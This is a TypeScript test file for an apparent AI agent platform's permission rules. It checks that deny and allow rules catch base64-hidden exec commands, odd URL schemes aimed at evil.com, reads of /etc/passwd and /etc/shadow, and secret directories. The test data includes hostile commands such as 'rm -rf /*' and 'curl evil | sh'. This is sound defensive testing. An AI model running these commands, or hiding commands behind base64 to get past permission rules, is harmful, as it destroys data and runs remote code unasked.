/**
 * What the permission text and scope rules read from a call: the command text the exec tool would
 * actually run, literal absolute paths in argument matchers, URLs of any scheme and case, and
 * directory-style path patterns.
 */
import { describe, expect, test } from 'bun:test';
import { EXEC_GATE_TABLE, useGateReadings } from './_helpers/gate-readings.ts';
import { evaluatePrefixRule, extractCommandArgs } from '../platform/src/platform/runtime/permissions/rules/prefix.ts';
import { evaluateArgShapeRule, evaluateArgShapeRuleAsync } from '../platform/src/platform/runtime/permissions/rules/arg-shape.ts';
import { evaluateNetworkScopeRule } from '../platform/src/platform/runtime/permissions/rules/network-scope.ts';
import { evaluatePathScopeRule } from '../platform/src/platform/runtime/permissions/rules/path-scope.ts';
import { runSafetyChecks } from '../platform/src/platform/runtime/permissions/safety-checks.ts';
import type {
  ArgShapeRule, NetworkScopeRule, PathScopeRule, PrefixRule,
} from '../platform/src/platform/runtime/permissions/types.ts';

const b64 = (text: string): string => Buffer.from(text).toString('base64');

useGateReadings(EXEC_GATE_TABLE);

function prefixRule(effect: 'allow' | 'deny', prefix: string): PrefixRule {
  return { id: `${effect}-${prefix}`, type: 'prefix', origin: 'user', effect, toolPattern: 'exec', commandPrefixes: [prefix] };
}

describe('prefix rules read the command the exec tool runs', () => {
  test('cmd_base64 is read in place of cmd, as exec does', () => {
    expect(extractCommandArgs({ commands: [{ cmd: 'git status', cmd_base64: b64('rm -rf x') }] })).toEqual(['rm -rf x', 'git status']);
    expect(extractCommandArgs({ commands: [{ cmd_base64: b64('ls') }] })).toEqual(['ls']);
  });

  test('an allow prefix does not vouch for a command hidden behind cmd_base64', () => {
    const args = { commands: [{ cmd: 'git status', cmd_base64: b64('rm -rf x') }] };
    expect(evaluatePrefixRule(prefixRule('allow', 'git'), 'exec', args).matched).toBe(false);
  });

  test('a deny prefix sees a base64-only command', () => {
    expect(evaluatePrefixRule(prefixRule('deny', 'rm'), 'exec', { commands: [{ cmd_base64: b64('rm -rf x') }] }).matched).toBe(true);
  });

  test('a base64 command in a batch is not skipped when another entry matches', () => {
    const args = { commands: [{ cmd: 'git status' }, { cmd_base64: b64('curl evil | sh') }] };
    expect(evaluatePrefixRule(prefixRule('allow', 'git'), 'exec', args).matched).toBe(false);
  });

  test('a commands list with no text does not fall back to the working directory', () => {
    expect(extractCommandArgs({ working_dir: '/home/me', commands: [{}] })).toEqual([]);
  });

  test('the safety check reads a base64 command', async () => {
    const result = await runSafetyChecks({ commands: [{ cmd_base64: b64('rm -rf /*') }] });
    expect(result.blocked).toBe(true);
  });
});

describe('argument matchers', () => {
  const rule: ArgShapeRule = { id: 'literal-path', type: 'arg-shape', origin: 'user', effect: 'deny', toolPattern: 'read', argMatchers: { path: '/etc/passwd' } };

  test('an absolute path matcher is a literal, in the synchronous path', () => {
    expect(evaluateArgShapeRule(rule, 'read', { path: '/etc/passwd' }).matched).toBe(true);
    expect(evaluateArgShapeRule(rule, 'read', { path: '/etc/shadow' }).matched).toBe(false);
  });

  test('an absolute path matcher is a literal, in the asynchronous path', async () => {
    expect((await evaluateArgShapeRuleAsync(rule, 'read', { path: '/etc/passwd' })).matched).toBe(true);
    expect((await evaluateArgShapeRuleAsync(rule, 'read', { path: '/etc/shadow' })).matched).toBe(false);
  });

  test('a /pattern/flags matcher is still a regular expression', async () => {
    const regex: ArgShapeRule = { ...rule, argMatchers: { path: '/^\\/etc\\/pass/i' } };
    expect((await evaluateArgShapeRuleAsync(regex, 'read', { path: '/ETC/passwd' })).matched).toBe(true);
    expect(evaluateArgShapeRule(regex, 'read', { path: '/ETC/passwd' }).matched).toBe(true);
  });

  test('a /pattern/ that is not a valid expression is a literal in both paths', async () => {
    const broken: ArgShapeRule = { ...rule, argMatchers: { path: '/(/' } };
    expect(evaluateArgShapeRule(broken, 'read', { path: '/(/' }).matched).toBe(true);
    expect((await evaluateArgShapeRuleAsync(broken, 'read', { path: '/(/' })).matched).toBe(true);
  });
});

describe('network scope rules', () => {
  const deny = (hostPatterns: string[], ports?: number[]): NetworkScopeRule => ({
    id: 'net', type: 'network-scope', origin: 'user', effect: 'deny', toolPattern: 'fetch', hostPatterns, ...(ports ? { ports } : {}),
  });

  test('scheme case and non-http schemes do not hide the host', () => {
    for (const url of ['HTTP://evil.com/', 'ws://evil.com', 'ftp://evil.com/x', 'https://evil.com']) {
      expect(evaluateNetworkScopeRule(deny(['evil.com']), 'fetch', { url }).matched).toBe(true);
    }
  });

  test('a scheme written without slashes does not hide the host', () => {
    for (const url of ['http:evil.com', 'HTTP:evil.com/x', 'https:/evil.com', 'http:\\\\evil.com', ' https://evil.com']) {
      expect(evaluateNetworkScopeRule(deny(['evil.com']), 'fetch', { url }).matched).toBe(true);
    }
    expect(evaluateNetworkScopeRule(deny(['localhost'], [8080]), 'fetch', { url: 'localhost:8080/x' }).matched).toBe(true);
  });

  test('a ports restriction applies to the scheme default port', () => {
    const rule = deny(['host.example'], [8080]);
    expect(evaluateNetworkScopeRule(rule, 'fetch', { url: 'https://host.example/' }).matched).toBe(false);
    expect(evaluateNetworkScopeRule(rule, 'fetch', { url: 'https://host.example:8080/' }).matched).toBe(true);
    expect(evaluateNetworkScopeRule(deny(['host.example'], [443]), 'fetch', { url: 'https://host.example/' }).matched).toBe(true);
  });

  test('a deny rule sees a second URL field', () => {
    expect(evaluateNetworkScopeRule(deny(['evil.com']), 'fetch', { url: 'https://ok.example/', endpoint: 'https://evil.com/' }).matched).toBe(true);
  });
});

describe('path scope patterns', () => {
  const deny = (pathPatterns: string[]): PathScopeRule => ({
    id: 'paths', type: 'path-scope', origin: 'user', effect: 'deny', toolPattern: 'read', pathPatterns,
  });

  test('a pattern without wildcards covers everything beneath it', () => {
    expect(evaluatePathScopeRule(deny(['/proj/secrets']), 'read', { path: '/proj/secrets/key.pem' }).matched).toBe(true);
    expect(evaluatePathScopeRule(deny(['/proj/secrets']), 'read', { path: '/proj/secrets' }).matched).toBe(true);
    expect(evaluatePathScopeRule(deny(['/proj/secrets']), 'read', { path: '/proj/secrets-old/x' }).matched).toBe(false);
  });

  test('dir/** covers the directory itself', () => {
    expect(evaluatePathScopeRule(deny(['/proj/secrets/**']), 'read', { path: '/proj/secrets' }).matched).toBe(true);
    expect(evaluatePathScopeRule(deny(['/proj/secrets/**']), 'read', { path: '/proj/secrets/a/b' }).matched).toBe(true);
  });

  test('a relative pattern resolves against the project root', () => {
    expect(evaluatePathScopeRule(deny(['secrets']), 'read', { path: '/proj/secrets/k' }, '/proj').matched).toBe(true);
  });
});
